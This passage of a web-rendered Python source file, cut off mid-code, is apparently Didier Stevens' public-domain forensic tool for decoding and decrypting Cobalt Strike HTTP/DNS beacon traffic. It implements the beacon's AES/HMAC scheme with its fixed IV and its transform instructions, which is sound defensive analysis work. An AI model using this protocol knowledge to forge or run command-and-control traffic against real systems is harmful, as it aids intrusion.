class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">__description__ = <span class="string">'Analyze Cobalt Strike HTTP/DNS beacon traffic'</span></span><br><span class="line">__author__ = <span class="string">'Didier Stevens'</span></span><br><span class="line">__version__ = <span class="string">'0.0.5'</span></span><br><span class="line">__date__ = <span class="string">'2022/02/15'</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Source code put in the public domain by Didier Stevens, no Copyright</span></span><br><span class="line"><span class="string">https://DidierStevens.com</span></span><br><span class="line"><span class="string">Use at your own risk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">History:</span></span><br><span class="line"><span class="string">  2021/04/17: start</span></span><br><span class="line"><span class="string">  2021/04/18: continue</span></span><br><span class="line"><span class="string">  2021/04/19: added option -r</span></span><br><span class="line"><span class="string">  2021/04/20: added option -Y; continue</span></span><br><span class="line"><span class="string">  2021/04/22: continue</span></span><br><span class="line"><span class="string">  2021/04/23: continue</span></span><br><span class="line"><span class="string">  2021/04/24: continue</span></span><br><span class="line"><span class="string">  2021/10/07: updated missing modules logic</span></span><br><span class="line"><span class="string">  2021/10/17: 0.0.2 added option -i; -r unknown and -k unknown</span></span><br><span class="line"><span class="string">  2021/10/28: handle fake gzip</span></span><br><span class="line"><span class="string">  2021/10/30: continue instructions processing</span></span><br><span class="line"><span class="string">  2021/10/31: added request methods</span></span><br><span class="line"><span class="string">  2021/11/01: refactoring instructions processing</span></span><br><span class="line"><span class="string">  2021/11/05: refactoring instructions processing</span></span><br><span class="line"><span class="string">  2021/11/17: 0.0.3 refactoring crypto &amp; parser</span></span><br><span class="line"><span class="string">  2021/11/20: added constants from https://github.com/verctor/Cobalt_Homework/blob/master/scripts/define.py</span></span><br><span class="line"><span class="string">  2021/11/26: merging HTTP and DNS</span></span><br><span class="line"><span class="string">  2021/12/12: 0.0.4 bugfix HMAC invalid; extra constants https://github.com/DidierStevens/Beta/issues/5</span></span><br><span class="line"><span class="string">  2022/02/15: 0.0.5 added error handling</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Todo:</span></span><br><span class="line"><span class="string">  add support for non-default DNS labels</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    print(<span class="string">'pyshark module required: pip install pyshark'</span>)</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> Crypto.Cipher.AES</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    print(<span class="string">'Crypto.Cipher.AES module required: pip install pycryptodome'</span>)</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintManual</span><span class="params">()</span>:</span></span><br><span class="line">    manual = <span class="string">'''</span></span><br><span class="line"><span class="string">Manual:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This tool can decode (and decrypt if encrypted) Cobalt Strike network traffic.</span></span><br><span class="line"><span class="string">For HTTP and DNS beacons. HTTPS works too provided the TLS traffic is decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># https://github.com/nccgroup/pybeacon</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> manual.split(<span class="string">'\n'</span>):</span><br><span class="line">        print(textwrap.fill(line))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cOutput</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, filenameOption=None)</span>:</span></span><br><span class="line">        self.starttime = time.time()</span><br><span class="line">        self.filenameOption = filenameOption</span><br><span class="line">        self.separateFiles = <span class="literal">False</span></span><br><span class="line">        self.progress = <span class="literal">False</span></span><br><span class="line">        self.console = <span class="literal">False</span></span><br><span class="line">        self.fOut = <span class="literal">None</span></span><br><span class="line">        self.rootFilenames = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> self.filenameOption:</span><br><span class="line">            <span class="keyword">if</span> self.ParseHash(self.filenameOption):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.separateFiles <span class="keyword">and</span> self.filename != <span class="string">''</span>:</span><br><span class="line">                    self.fOut = open(self.filename, <span class="string">'w'</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.filenameOption != <span class="string">''</span>:</span><br><span class="line">                self.fOut = open(self.filenameOption, <span class="string">'w'</span>)</span><br><span class="line">        self.dReplacements = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Replace</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.dReplacements.items():</span><br><span class="line">            line = line.replace(key, value)</span><br><span class="line">        <span class="keyword">return</span> line</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ParseHash</span><span class="params">(self, option)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> option.startswith(<span class="string">'#'</span>):</span><br><span class="line">            position = self.filenameOption.find(<span class="string">'#'</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> position &gt; <span class="number">1</span>:</span><br><span class="line">                switches = self.filenameOption[<span class="number">1</span>:position]</span><br><span class="line">                self.filename = self.filenameOption[position + <span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">for</span> switch <span class="keyword">in</span> switches:</span><br><span class="line">                    <span class="keyword">if</span> switch == <span class="string">'s'</span>:</span><br><span class="line">                        self.separateFiles = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">elif</span> switch == <span class="string">'p'</span>:</span><br><span class="line">                        self.progress = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">elif</span> switch == <span class="string">'c'</span>:</span><br><span class="line">                        self.console = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">elif</span> switch == <span class="string">'l'</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">elif</span> switch == <span class="string">'g'</span>:</span><br><span class="line">                        <span class="keyword">if</span> self.filename != <span class="string">''</span>:</span><br><span class="line">                            extra = self.filename + <span class="string">'-'</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            extra = <span class="string">''</span></span><br><span class="line">                        self.filename = <span class="string">'%s-%s%s.txt'</span> % (os.path.splitext(os.path.basename(sys.argv[<span class="number">0</span>]))[<span class="number">0</span>], extra, self.FormatTime())</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FormatTime</span><span class="params">(epoch=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> epoch == <span class="literal">None</span>:</span><br><span class="line">            epoch = time.time()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%04d%02d%02d-%02d%02d%02d'</span> % time.localtime(epoch)[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">RootUnique</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root <span class="keyword">in</span> self.rootFilenames:</span><br><span class="line">            self.rootFilenames[root] = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        iter = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            newroot = <span class="string">'%s_%04d'</span> % (root, iter)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> newroot <span class="keyword">in</span> self.rootFilenames:</span><br><span class="line">                self.rootFilenames[newroot] = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">return</span> newroot</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Line</span><span class="params">(self, line, eol=<span class="string">'\n'</span>)</span>:</span></span><br><span class="line">        line = self.Replace(line)</span><br><span class="line">        <span class="keyword">if</span> self.fOut == <span class="literal">None</span> <span class="keyword">or</span> self.console:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(line, end=eol)</span><br><span class="line">            <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">                encoding = sys.stdout.encoding</span><br><span class="line">                print(line.encode(encoding, errors=<span class="string">'backslashreplace'</span>).decode(encoding), end=eol)</span><br><span class="line"><span class="comment">#            sys.stdout.flush()</span></span><br><span class="line">        <span class="keyword">if</span> self.fOut != <span class="literal">None</span>:</span><br><span class="line">            self.fOut.write(line + <span class="string">'\n'</span>)</span><br><span class="line">            self.fOut.flush()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LineTimestamped</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        self.Line(<span class="string">'%s: %s'</span> % (self.FormatTime(), line))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Filename</span><span class="params">(self, filename, index, total)</span>:</span></span><br><span class="line">        self.separateFilename = filename</span><br><span class="line">        <span class="keyword">if</span> self.progress:</span><br><span class="line">            <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">                eta = <span class="string">''</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                seconds = int(float((time.time() - self.starttime) / float(index)) * float(total - index))</span><br><span class="line">                eta = <span class="string">'estimation %d seconds left, finished %s '</span> % (seconds, self.FormatTime(time.time() + seconds))</span><br><span class="line">            PrintError(<span class="string">'%d/%d %s%s'</span> % (index + <span class="number">1</span>, total, eta, self.separateFilename))</span><br><span class="line">        <span class="keyword">if</span> self.separateFiles <span class="keyword">and</span> self.filename != <span class="string">''</span>:</span><br><span class="line">            oFilenameVariables = cVariables()</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'f'</span>, self.separateFilename)</span><br><span class="line">            basename = os.path.basename(self.separateFilename)</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'b'</span>, basename)</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'d'</span>, os.path.dirname(self.separateFilename))</span><br><span class="line">            root, extension = os.path.splitext(basename)</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'r'</span>, root)</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'ru'</span>, self.RootUnique(root))</span><br><span class="line">            oFilenameVariables.SetVariable(<span class="string">'e'</span>, extension)</span><br><span class="line"></span><br><span class="line">            self.Close()</span><br><span class="line">            self.fOut = open(oFilenameVariables.Instantiate(self.filename), <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.fOut != <span class="literal">None</span>:</span><br><span class="line">            self.fOut.close()</span><br><span class="line">            self.fOut = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InstantiateCOutput</span><span class="params">(options)</span>:</span></span><br><span class="line">    filenameOption = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> options.output != <span class="string">''</span>:</span><br><span class="line">        filenameOption = options.output</span><br><span class="line">    <span class="keyword">return</span> cOutput(filenameOption)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cCrypto</span><span class="params">(object)</span>:</span></span><br><span class="line">    CS_FIXED_IV = <span class="string">b'abcdefghijklmnop'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, rawkey=<span class="string">''</span>, hmacaeskeys=<span class="string">''</span>)</span>:</span></span><br><span class="line">        self.rawkey = rawkey</span><br><span class="line">        self.hmacaeskeys = hmacaeskeys</span><br><span class="line">        <span class="keyword">if</span> self.rawkey != <span class="string">''</span> <span class="keyword">and</span> self.rawkey != <span class="string">'unknown'</span>:</span><br><span class="line">            sha256digest = hashlib.sha256(binascii.a2b_hex(self.rawkey)).digest()</span><br><span class="line">            self.hmackey = sha256digest[<span class="number">16</span>:]</span><br><span class="line">            self.aeskey = sha256digest[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">elif</span> self.hmacaeskeys != <span class="string">''</span> <span class="keyword">and</span> self.hmacaeskeys != <span class="string">'unknown'</span>:</span><br><span class="line">            self.hmackey = binascii.a2b_hex(self.hmacaeskeys.split(<span class="string">':'</span>)[<span class="number">0</span>])</span><br><span class="line">            self.aeskey = binascii.a2b_hex(self.hmacaeskeys.split(<span class="string">':'</span>)[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.hmackey = <span class="literal">None</span></span><br><span class="line">            self.aeskey = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.aeskey == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        encryptedData = data[:<span class="number">-16</span>]</span><br><span class="line">        hmacSignatureMessage = data[<span class="number">-16</span>:]</span><br><span class="line">        hmacsSgnatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> hmacSignatureMessage != hmacsSgnatureCalculated:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'HMAC signature invalid'</span>)</span><br><span class="line">        cypher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, __class__.CS_FIXED_IV)</span><br><span class="line">        decryptedData = cypher.decrypt(encryptedData)</span><br><span class="line">        <span class="keyword">return</span> decryptedData</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cypher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, __class__.CS_FIXED_IV)</span><br><span class="line">        encryptedData = cypher.encrypt(data)</span><br><span class="line">        hmacsSgnatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">return</span> encryptedData + hmacsSgnatureCalculated</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cStruct</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self.data = data</span><br><span class="line">        self.originaldata = data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Unpack</span><span class="params">(self, format)</span>:</span></span><br><span class="line">        formatsize = struct.calcsize(format)</span><br><span class="line">        <span class="keyword">if</span> len(self.data) &lt; formatsize:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Not enough data'</span>)</span><br><span class="line">        tounpack = self.data[:formatsize]</span><br><span class="line">        self.data = self.data[formatsize:]</span><br><span class="line">        result = struct.unpack(format, tounpack)</span><br><span class="line">        <span class="keyword">if</span> len(result) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Truncate</span><span class="params">(self, length)</span>:</span></span><br><span class="line">        self.data = self.data[:length]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetBytes</span><span class="params">(self, length=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> length == <span class="literal">None</span>:</span><br><span class="line">            length = len(self.data)</span><br><span class="line">        result = self.data[:length]</span><br><span class="line">        self.data = self.data[length:]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetString</span><span class="params">(self, format)</span>:</span></span><br><span class="line">        stringLength = self.Unpack(format)</span><br><span class="line">        <span class="keyword">return</span> self.GetBytes(stringLength)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cCSInstructions</span><span class="params">(object)</span>:</span></span><br><span class="line">    CS_INSTRUCTION_TYPE_INPUT = <span class="string">'Input'</span></span><br><span class="line">    CS_INSTRUCTION_TYPE_OUTPUT = <span class="string">'Output'</span></span><br><span class="line">    CS_INSTRUCTION_TYPE_METADATA = <span class="string">'Metadata'</span></span><br><span class="line">    CS_INSTRUCTION_TYPE_SESSIONID = <span class="string">'SessionId'</span></span><br><span class="line"></span><br><span class="line">    CS_INSTRUCTION_NONE = <span class="number">0</span></span><br><span class="line">    CS_INSTRUCTION_APPEND = <span class="number">1</span></span><br><span class="line">    CS_INSTRUCTION_PREPEND = <span class="number">2</span></span><br><span class="line">    CS_INSTRUCTION_BASE64 = <span class="number">3</span></span><br><span class="line">    CS_INSTRUCTION_PRINT = <span class="number">4</span></span><br><span class="line">    CS_INSTRUCTION_PARAMETER = <span class="number">5</span></span><br><span class="line">    CS_INSTRUCTION_HEADER = <span class="number">6</span></span><br><span class="line">    CS_INSTRUCTION_BUILD = <span class="number">7</span></span><br><span class="line">    CS_INSTRUCTION_NETBIOS = <span class="number">8</span></span><br><span class="line">    CS_INSTRUCTION_CONST_PARAMETER = <span class="number">9</span></span><br><span class="line">    CS_INSTRUCTION_CONST_HEADER = <span class="number">10</span></span><br><span class="line">    CS_INSTRUCTION_NETBIOSU = <span class="number">11</span></span><br><span class="line">    CS_INSTRUCTION_URI_APPEND = <span class="number">12</span></span><br><span class="line">    CS_INSTRUCTION_BASE64URL = <span class="number">13</span></span><br><span class="line">    CS_INSTRUCTION_STRREP = <span class="number">14</span></span><br><span class="line">    CS_INSTRUCTION_MASK = <span class="number">15</span></span><br><span class="line">    CS_INSTRUCTION_CONST_HOST_HEADER = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, instructionType, instructions)</span>:</span></span><br><span class="line">        self.instructionType = instructionType</span><br><span class="line">        self.instructions = instructions</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">StartsWithGetRemainder</span><span class="params">(strIn, strStart)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> strIn.startswith(strStart):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, strIn[len(strStart):]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">BASE64URLDecode</span><span class="params">(data)</span>:</span></span><br><span class="line">        paddingLength = <span class="number">4</span> - len(data) % <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> paddingLength &lt;= <span class="number">2</span>:</span><br><span class="line">            data += <span class="string">b'='</span> * paddingLength</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(data, <span class="string">b'-_'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">NETBIOSDecode</span><span class="params">(netbios)</span>:</span></span><br><span class="line">        dTranslate = &#123;</span><br><span class="line">            ord(<span class="string">b'A'</span>): ord(<span class="string">b'0'</span>),</span><br><span class="line">            ord(<span class="string">b'B'</span>): ord(<span class="string">b'1'</span>),</span><br><span class="line">            ord(<span class="string">b'C'</span>): ord(<span class="string">b'2'</span>),</span><br><span class="line">            ord(<span class="string">b'D'</span>): ord(<span class="string">b'3'</span>),</span><br><span class="line">            ord(<span class="string">b'E'</span>): ord(<span class="string">b'4'</span>),</span><br><span class="line">            ord(<span class="string">b'F'</span>): ord(<span class="string">b'5'</span>),</span><br><span class="line">            ord(<span class="string">b'G'</span>): ord(<span class="string">b'6'</span>),</span><br><span class="line">            ord(<span class="string">b'H'</span>): ord(<span class="string">b'7'</span>),</span><br><span class="line">            ord(<span class="string">b'I'</span>): ord(<span class="string">b'8'</span>),</span><br><span class="line">            ord(<span class="string">b'J'</span>): ord(<span class="string">b'9'</span>),</span><br><span class="line">            ord(<span class="string">b'K'</span>): ord(<span class="string">b'A'</span>),</span><br><span class="line">            ord(<span class="string">b'L'</span>): ord(<span class="string">b'B'</span>),</span><br><span class="line">            ord(<span class="string">b'M'</span>): ord(<span class="string">b'C'</span>),</span><br><span class="line">            ord(<span class="string">b'N'</span>): ord(<span class="string">b'D'</span>),</span><br><span class="line">            ord(<span class="string">b'O'</span>): ord(<span class="string">b'E'</span>),</span><br><span class="line">            ord(<span class="string">b'P'</span>): ord(<span class="string">b'F'</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> binascii.a2b_hex(bytes([dTranslate[char] <span class="keyword">for</span> char <span class="keyword">in</span> netbios]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetInstructions</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> self.instructions.split(<span class="string">';'</span>):</span><br><span class="line">            match, remainder = __class__.StartsWithGetRemainder(result, <span class="string">'7:%s,'</span> % self.instructionType)</span><br><span class="line">            <span class="keyword">if</span> match:</span><br><span class="line">                <span class="keyword">if</span> self.instructionType <span class="keyword">in</span> [__class__.CS_INSTRUCTION_TYPE_OUTPUT, __class__.CS_INSTRUCTION_TYPE_METADATA]:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">','</span>.join(remainder.split(<span class="string">','</span>)[::<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> remainder</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ProcessInstructions</span><span class="params">(self, rawdata)</span>:</span></span><br><span class="line">        instructions = self.GetInstructions()</span><br><span class="line">        <span class="keyword">if</span> instructions == <span class="string">''</span>:</span><br><span class="line">            instructions = []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            instructions = [instruction <span class="keyword">for</span> instruction <span class="keyword">in</span> instructions.split(<span class="string">','</span>)]</span><br><span class="line">        data = rawdata</span><br><span class="line">        <span class="keyword">for</span> instruction <span class="keyword">in</span> instructions:</span><br><span class="line">            instruction = instruction.split(<span class="string">':'</span>)</span><br><span class="line">            opcode = int(instruction[<span class="number">0</span>])</span><br><span class="line">            operands = instruction[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span> opcode == __class__.CS_INSTRUCTION_NONE:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_APPEND:</span><br><span class="line">                <span class="keyword">if</span> self.instructionType == __class__.CS_INSTRUCTION_TYPE_METADATA:</span><br><span class="line">                    data = data[:-len(operands[<span class="number">0</span>])]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = data[:-int(operands[<span class="number">0</span>])]</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_PREPEND:</span><br><span class="line">                <span class="keyword">if</span> self.instructionType == __class__.CS_INSTRUCTION_TYPE_METADATA:</span><br><span class="line">                    data = data[len(operands[<span class="number">0</span>]):]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = data[int(operands[<span class="number">0</span>]):]</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_BASE64:</span><br><span class="line">                data = binascii.a2b_base64(data)</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_PRINT:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_PARAMETER:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_HEADER:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_BUILD:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_NETBIOS:</span><br><span class="line">                data = __class__.NETBIOSDecode(data.upper())</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_CONST_PARAMETER:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_CONST_HEADER:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_NETBIOSU:</span><br><span class="line">                data = __class__.NETBIOSDecode(data)</span><br><span class="line">            <span class="keyword">elif</span> opcode == __class__.CS_INSTRUCTION_URI_APPEND:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span 